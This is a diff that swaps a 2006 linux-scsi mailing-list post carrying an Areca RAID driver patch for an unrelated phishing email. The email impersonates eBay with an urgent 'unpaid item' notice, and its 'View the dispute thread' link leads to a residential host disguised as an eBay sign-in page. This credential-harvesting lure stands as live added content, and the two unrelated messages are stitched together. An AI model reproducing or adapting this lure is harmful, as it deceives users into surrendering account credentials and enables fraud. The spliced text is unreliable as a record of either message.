@@ -1,65 +1,50 @@
-From: "erich" <erich@areca.com.tw>
-Subject: areca-raid-linux-scsi-driver-update7-fix-3.patch
-Date: Tue, 11 Jul 2006 12:07:24 +0800
-Message-ID: <001701c6a49f$859e3090$b100a8c0@erich2003>
+From: "eBay" <aw-confirm@ebay.com>
+Subject: eBay New Unpaid Item Message from bbsq63: #300005830966
+Date: Tue, 11 Jul 2006 07:32:06 +0300
+Message-ID: <200607110431.k6B4Vsr21778@teamkorea.com>
+Reply-To: <aw-confirm@ebay.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed;
-	boundary="----=_NextPart_000_0014_01C6A4E2.922C78B0"
+Content-Type: text/plain;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from 220-130-178-143.HINET-IP.hinet.net ([220.130.178.143]:36348
-	"EHLO areca.com.tw") by vger.kernel.org with ESMTP id S965008AbWGKEHg
-	(ORCPT <rfc822;linux-scsi@vger.kernel.org>);
-	Tue, 11 Jul 2006 00:07:36 -0400
+Received: from [222.122.43.15] ([222.122.43.15]:42958 "EHLO teamkorea.com")
+	by vger.kernel.org with ESMTP id S965143AbWGKEgC (ORCPT
+	<rfc822;linux-scsi@vger.kernel.org>);
+	Tue, 11 Jul 2006 00:36:02 -0400
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Andrew Morton <akpm@osdl.org>
-Cc: James.Bottomley@SteelEye.com, rdunlap@xenotime.net, hch@infradead.org, brong@fastmail.fm, dax@gurulabs.com, linux-kernel@vger.kernel.org, linux-scsi@vger.kernel.org, robm@fastmail.fm
 
-This is a multi-part message in MIME format.
+<P>
+<TABLE cellSpacing=0 cellPadding=0 width=600>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" width=600>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0 xmlns:x="urn:schemas-microsoft-com:xslt">
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" width=600>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" bgColor=#eeeef8 border=0>
+<TBODY>
+<TR>
+<TD width=2><IMG src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width=2></TD>
+<TD><FONT face=Arial size=4>eBay New Unpaid Item Message from bbsq63: #300005830966
 
-------=_NextPart_000_0014_01C6A4E2.922C78B0
-Content-Type: text/plain;
-	format=flowed;
-	charset="big5";
-	reply-type=original
-Content-Transfer-Encoding: 7bit
-
-From: Erich Chen <erich@areca.com.tw>
-
-  1- fix the return value of sysfs read / write
-
-Signed-off-by: Erich Chen <erich@areca.com.tw>
-
-Best Regards
-Erich Chen
-------=_NextPart_000_0014_01C6A4E2.922C78B0
-Content-Type: application/x-compressed;
-	name="areca-raid-linux-scsi-driver-update7-fix-3.patch.gz"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment;
-	filename="areca-raid-linux-scsi-driver-update7-fix-3.patch.gz"
-
-H4sICOHltEQAA2FyZWNhLXJhaWQtbGludXgtc2NzaS1kcml2ZXItdXBkYXRlNy1maXgtMy5wYXRj
-aADNV21T20YQ/iz9ik0+MJYt2ZKMDbULE+OYKdMAid2k7UxnbmTpZBT04t5JvEyhv717JwnbwhhI
-QwbNWC+nvb1nn2d3Tz5kSdSDEQvcMxie0Rh+puL+ncOo6zTdJGqml/uqCmAZ4AdXkJ5RYDTNWAwX
-TphRSHzg19znOOp40IJLFqRUVSfBLKaekfi+Mb1+fAHDMFTwWHBBGW9xlwcth7kRZ8WFOGnKmi7c
-AECnA43qYSwOFSwEGlIO7pkTz6inQ7sDQcwpS4Mk5rWGpoNtgkdDmg8YmirWhzCIs6vWoyCaCZsp
-tml2DXPHsGwwt3vtds+0m2Z5gGF2TVNFXE/1ueKv07N3e3bnnr9378DYMfVdaMgzPhY+JP8kSOYk
-opw7M0qEFjWessxN4TyZqqBkQZzukhTq80/TzPcp0+vzNCof+miBBm0bLZwwvMIhEqJWe2DiK9VQ
-Ah9qb1xn7kxDWhsOPpLJnxMyeH98dKLBzQ3UUGdogJtkcarBPlhm25bjcgS2tjBNfA320J+G3pQi
-g9B5Y5NrDV+XtsZoMByOJgIOKK06eAkU0UIWB6lMvybUW/h2KTCMoHYXuoZjfUmjZXX0n6AhLpa5
-kUmZzgsql3iKrgmN5um1IEqHjOeU6XD5Ny5D/IDxNIg9elWOhE4x0F8rB0g9hJs7SV6Sd+MbmM9n
-5K7ztVbNjk6+DD7018sjeVzSZxHoGomQH36XgbWCcE0uXOhnd/Qd1M/u4uV58lXlwRUcd2rsV8dl
-SWC4FfHgzd49hTX4B42VAsQ84SkpVK2ha61fzfjFAzIVU+qJjsquJTe3QENOc4fLGSaIqK5rVLEZ
-YGlioqJs1Qbj4fFkTI4Hf5BPB58PD0dj+brgb7sr+dveeTZ/inIrz0UMhSg4cofcUCrhbopXesPf
-bY6ra4n+ZnXtRxqcG1KHreAq7o9zg88i5whOiWgEdUZnpczzKFtbf08rtxdqZ2KORIcn4ofOjMMW
-DIYH5JAcnX58P/htQE6/jMaHH05/L3OtYr0H/663z/W2bUu3u9CwbVtvtwWzGH/JLjb8xC04FttR
-SevAc+apxEcZS0Sd5jYuttqUkmkQE7HR1rbOMOONfS4uKIzDuUcvmrjtfNWLZFyRcXmPkuvJAhEU
-yGW0gsP8AaNFzuYM4Z7Xfh2NT8hoPIa3ucMeSOjF90eUSZfgOwjK+yt+q8m0nCVpAtLZHeIVCHkr
-vH2pKGUBfecwpc/nxCknvHCgsiK/c6DS53MClRMWgS7qcuOEHuLNg2E0Si6eyEWjwuNz5j41YRqr
-PD5M3FoID+TKpiR5VVQsd4j/z8T95rChK/QW2SOt+uUOZW/v6lYbO2mnq9vy03Gzl4sk8NSy0/qM
-0ocaLWXDJE5ZEh5gCZxDXXw5yF5fGE3wvwP5BQmEuqCx3M/EvWQH+3mJ9DVpWGkL34LricILcje1
-jh9Rrz8wwPuF/ZqqcIH1gY35VnxYqP8BjF6EcH4QAAA=
-
-------=_NextPart_000_0014_01C6A4E2.922C78B0--
-
+ -- response required</FONT> </TD>
+<TD vAlign=center><A href="http://www.ebay.com/" target=_blank><IMG src="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif" align=right border=0></A></TD></TR>
+<TR bgColor=#9999cc height=2>
+<TD colSpan=3></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE style="FONT-SIZE: x-small; FONT-FAMILY: arial, sans-serif" cellSpacing=0 cellPadding=0 width="94%" align=center border=0>
+<TBODY>
+<TR>
+<TD><BR><BR>
+Dear member, <BR>
+<BR></TD></TR>
+<TR>
+<TD>eBay member bbsq63 has left you a message regarding item #300005830966<BR>
+  <BR><A href="http://cpe-065-190-152-094.nc.res.rr.com/crm/ws/signin.ebay/eBayISAPI.dl/SignIn&pUserId/index.html?SignIn&co_partnerId=2&pUserId=&siteid=0&pageType=&pa1=&i1=&bshowgif=&UsingSSL=&ru=http%3A%2F%2Fwww.ebay.com&pp=&pa2=&errmsg=&runame=&ruparams=&ruproduct=&sid=&favoritenav=&confirm=&ebxPageType=&existingEmail=&isCheckout=&migrateVisitor=" target=_blank><FONT color=#003399>View the dispute thread to respond</FONT></A>. <BR>
+  <BR></TD></TR>
+<TR>
+<TD>Regards, <BR><BR>eBay </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P>
